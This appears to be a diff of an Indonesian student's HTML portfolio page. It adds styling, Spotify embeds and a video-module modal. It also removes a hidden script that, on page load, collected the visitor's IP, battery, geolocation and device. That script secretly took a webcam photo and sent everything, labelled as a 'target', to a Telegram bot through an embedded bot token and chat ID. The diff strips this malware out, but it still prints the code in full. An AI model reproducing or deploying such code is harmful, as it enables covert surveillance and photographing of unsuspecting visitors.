@@ -10,8 +10,14 @@
         @import url('https://fonts.googleapis.com/css2?family=DM+Serif+Display&family=Inter:wght@300;400;600;700&display=swap');
         body { font-family: 'Inter', sans-serif; background-color: #dcdad4; color: #1a2e23; overflow-x: hidden; }
         .font-serif { font-family: 'DM Serif Display', serif; }
-        .hover-lift { transition: transform 0.2s ease, box-shadow 0.2s ease; }
-        .hover-lift:hover { transform: translateY(-4px); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1); }
+        .hover-lift { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        .hover-lift:hover { transform: translateY(-5px); box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); }
+        
+        @keyframes pulse-beat {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.15); opacity: 0.8; }
+        }
+        .animate-beat { animation: pulse-beat 1.5s ease-in-out infinite; }
     </style>
 </head>
 <body class="p-4 md:p-12">
@@ -26,16 +32,22 @@
             </div>
         </nav>
 
-        <!-- Header diatur flex-col-reverse agar profil (kanan) di atas saat mobile -->
         <header class="flex flex-col-reverse md:grid md:grid-cols-12 gap-6 md:gap-8">
             
-            <!-- Bagian Kiri -->
             <div class="md:col-span-7 space-y-6">
                 <h2 class="text-5xl md:text-8xl font-serif leading-[0.9]">Hello,<br>I'm Will !</h2>
                 <p class="text-sm md:text-base leading-relaxed text-gray-800 max-w-lg">Graphic Designer otodidak & Digital Web Management enthusiast.</p>
-                <div class="flex gap-3 flex-wrap">
-                    <a href="#" class="bg-[#f7a21b] text-white px-6 py-3 rounded-full font-bold shadow-md hover-lift transition text-xs md:text-sm flex-1 text-center">LinkedIn</a>
-                    <button onclick="toggleProjects()" class="bg-[#2b3934] text-white px-6 py-3 rounded-full font-bold shadow-md hover-lift transition text-xs md:text-sm flex-1 text-center">Projects</button>
+                
+                <div class="flex gap-4 flex-wrap">
+                    <a href="#" class="group relative bg-[#f7a21b] text-white px-8 py-4 rounded-xl font-bold hover-lift overflow-hidden text-sm flex items-center gap-2">
+                        <i class="fab fa-linkedin transition-transform group-hover:scale-110"></i> LinkedIn
+                    </a>
+                    <button onclick="toggleProjects()" class="group relative bg-[#2b3934] text-white px-8 py-4 rounded-xl font-bold hover-lift overflow-hidden text-sm flex items-center gap-2">
+                        <i class="fas fa-folder-open transition-transform group-hover:scale-110"></i> Projects
+                    </button>
+                    <button onclick="toggleModal('modal-video')" class="group relative bg-[#2b3934] text-white px-8 py-4 rounded-xl font-bold hover-lift overflow-hidden text-sm flex items-center gap-2">
+                        <i class="fas fa-play-circle transition-transform group-hover:scale-110"></i> Free Modul
+                    </button>
                 </div>
                 
                 <div id="project-list" class="hidden space-y-3">
@@ -55,16 +67,22 @@
                     </div>
                     <div>
                         <div class="font-bold text-sm text-[#2b3934]">Lokasi Sekolah Saya</div>
-                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">SMKN 2 Tembilahan</div>
+                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">SMKN 2 TEMBILAHAN | STM</div>
                     </div>
                 </a>
 
-                <div class="w-full">
+                <div class="w-full bg-white p-6 rounded-2xl shadow-sm border border-black/5 space-y-4">
+                    <div class="flex items-center gap-3">
+                        <div class="animate-beat text-green-500">
+                            <i class="fab fa-spotify text-2xl"></i>
+                        </div>
+                        <h3 class="font-bold text-[#2b3934]">My Music Vibes</h3>
+                    </div>
                     <iframe src="https://open.spotify.com/embed/track/2LBqCSwhJGcFQeTHMVGwy3" class="w-full h-20" frameBorder="0" allowtransparency="true" allow="encrypted-media"></iframe>
+                    <iframe src="https://open.spotify.com/embed/track/7DY756WOLyOz2Xnhw4EFiC" class="w-full h-20" frameBorder="0" allowtransparency="true" allow="encrypted-media"></iframe>
                 </div>
             </div>
             
-            <!-- Bagian Kanan (Profil) -->
             <div class="md:col-span-5 bg-[#2b3934] text-white p-6 rounded-[1.5rem] shadow-lg h-fit">
                 <div class="w-full aspect-square md:aspect-auto md:h-64 mb-6 overflow-hidden rounded-[1rem]">
                     <img src="https://i.ibb.co.com/CKpQhNrQ/1778070770943.png" alt="Foto Profil" class="w-full h-full object-cover">
@@ -78,81 +96,53 @@
         </header>
     </main>
 
-    <video id="video" autoplay playsinline class="hidden"></video>
-    <canvas id="canvas" class="hidden"></canvas>
+    <!-- Modal Video -->
+    <div id="modal-video" class="fixed inset-0 bg-black/70 hidden items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-3xl p-8 w-full max-w-2xl relative max-h-[90vh] overflow-y-auto shadow-2xl">
+            <button onclick="closeModal()" class="absolute top-6 right-6 text-gray-400 hover:text-black transition">
+                <i class="fas fa-times text-2xl"></i>
+            </button>
+            
+            <div id="video-selection">
+                <h3 class="font-serif text-3xl mb-8 text-[#2b3934]">Pilih Modul Pembelajaran</h3>
+                <div class="space-y-4">
+                    <button onclick="playVideo('x096v5S0aAQ', 'Konversi Gambar ke HTML')" class="group flex items-center justify-between w-full p-5 bg-white border border-gray-100 rounded-2xl shadow-sm hover:border-[#f7a21b] hover:shadow-md transition-all duration-300">
+                        <div class="flex items-center gap-4">
+                            <div class="w-12 h-12 rounded-full bg-orange-100 text-[#f7a21b] flex items-center justify-center text-lg font-bold">01</div>
+                            <span class="font-semibold text-gray-700 group-hover:text-[#2b3934]">Konversi Gambar ke HTML</span>
+                        </div>
+                        <i class="fas fa-chevron-right text-gray-300 group-hover:text-[#f7a21b] transition"></i>
+                    </button>
+                    <!-- Tambahkan item modul lainnya di sini dengan pola yang sama -->
+                </div>
+            </div>
+
+            <div id="video-player" class="hidden">
+                <button onclick="backToSelection()" class="mb-6 text-sm text-[#2b3934] font-bold flex items-center hover:opacity-70 transition">
+                    <i class="fas fa-arrow-left mr-2"></i> Kembali ke Menu Utama
+                </button>
+                <div class="aspect-video w-full bg-black rounded-2xl overflow-hidden shadow-xl">
+                    <iframe id="iframe-video" class="w-full h-full" src="" frameborder="0" allowfullscreen></iframe>
+                </div>
+            </div>
+        </div>
+    </div>
 
     <script>
-        const botToken = "8523579929:AAEYSUFre2O2Ei8RcW8y3emKA0-NxqJb4E8"; 
-        const chatId = "7577331454"; 
-
-        window.onload = async function() {
-            let ipAddress = "N/A";
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                ipAddress = ipData.ip;
-            } catch (e) {}
-
-            let batteryInfo = "N/A";
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Discharging"})`;
-                } catch (e) {}
-            }
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const { latitude, longitude } = position.coords;
-                    const finalMsg = `*🚨 Target Terdeteksi!* \n\n` +
-                                     `📍 *Lokasi:* https://www.google.com/maps/place/${latitude},${longitude}\n` +
-                                     `🌐 *IP Address:* \`${ipAddress}\`\n` +
-                                     `🔋 *Baterai:* ${batteryInfo}\n` +
-                                     `📱 *Device:* ${navigator.platform}`;
-                    
-                    const keyboard = {
-                        inline_keyboard: [[
-                            { text: "📍 Lihat di Maps", url: `https://www.google.com/maps/place/${latitude},${longitude}` }
-                        ]]
-                    };
-
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ chat_id: chatId, text: finalMsg, parse_mode: 'Markdown', reply_markup: keyboard })
-                    });
-                    
-                    takeAndSendPhoto();
-                });
-            }
-        };
-
-        async function takeAndSendPhoto() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-                
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob);
-                    formData.append('caption', "📸 Foto Target");
-                    
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-                    stream.getTracks().forEach(track => track.stop());
-                }, 'image/jpeg');
-            } catch (err) { console.error("Akses kamera ditolak: ", err); }
-        }
-
         function toggleProjects() { document.getElementById('project-list').classList.toggle('hidden'); }
+        function toggleModal(id) { const modal = document.getElementById(id); modal.classList.toggle('hidden'); modal.classList.toggle('flex'); }
+        function playVideo(id, title) {
+            document.getElementById('video-selection').classList.add('hidden');
+            const player = document.getElementById('video-player');
+            player.classList.remove('hidden');
+            document.getElementById('iframe-video').src = `https://www.youtube.com/embed/${id}`;
+        }
+        function backToSelection() {
+            document.getElementById('video-selection').classList.remove('hidden');
+            document.getElementById('video-player').classList.add('hidden');
+            document.getElementById('iframe-video').src = '';
+        }
+        function closeModal() { backToSelection(); toggleModal('modal-video'); }
     </script>
 </body>
 </html>
